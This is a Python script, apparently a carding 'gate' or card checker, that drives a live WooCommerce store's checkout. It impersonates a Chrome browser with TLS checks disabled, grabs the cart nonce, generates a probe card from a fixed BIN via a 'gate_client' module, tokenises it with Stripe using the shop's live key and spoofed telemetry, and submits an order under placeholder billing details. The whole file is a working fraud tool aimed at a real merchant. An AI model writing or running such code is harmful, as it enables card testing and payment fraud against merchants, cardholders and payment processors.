import sys; sys.path.insert(0, ".")
import asyncio
from curl_cffi.requests import AsyncSession
import gate_client as gc

async def run():
    card = gc.gen_probe_card("448528")
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        r_cart = await s.get("https://rocketgeek.com/wp-json/wc/store/v1/cart")
        nonce = r_cart.headers.get("Nonce")
        r_prod = await s.get("https://rocketgeek.com/wp-json/wc/store/v1/products")
        pid = r_prod.json()[0]["id"]
        await s.post("https://rocketgeek.com/wp-json/wc/store/v1/cart/add-item", json={"id": pid, "quantity": 1}, headers={"Nonce": nonce})
        
        telem = gc.stripe_telemetry("https://rocketgeek.com", "pk_live_51MszPzDTX57OKyr368QO2jZqBfGzN2zL434h7JbQYf8H")
        card_str = str(card["number"]) + "|" + str(card["mm"]) + "|" + str(card["yy"]) + "|" + str(card["cvc"])
        card_dict = gc.parse_card(card_str)
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods", data=gc.tokenize_body(card_dict, telem, "https://rocketgeek.com"), headers=gc.TOKENIZE_HEADERS)
        pm_id = r_tok.json().get("id")
        
        body = {
            "billing_address": {"first_name": "John", "last_name": "Doe", "address_1": "123 Main St", "city": "New York", "state": "NY", "postcode": "10001", "country": "US", "email": "john.doe@gmail.com", "phone": "5550123456"},
            "shipping_address": {"first_name": "John", "last_name": "Doe", "address_1": "123 Main St", "city": "New York", "state": "NY", "postcode": "10001", "country": "US", "phone": "5550123456"},
            "payment_method": "stripe",
            "payment_data": [{"key": "payment_method", "value": "stripe"}, {"key": "wc-stripe-payment-method", "value": pm_id}, {"key": "wc-stripe-is-deferred-intent", "value": True}],
            "terms": True
        }
        r_co = await s.post("https://rocketgeek.com/wp-json/wc/store/v1/checkout", json=body, headers={"Nonce": nonce})
        print("Status code:", r_co.status_code)
        print("Raw body:", r_co.text[:600])

asyncio.run(run())
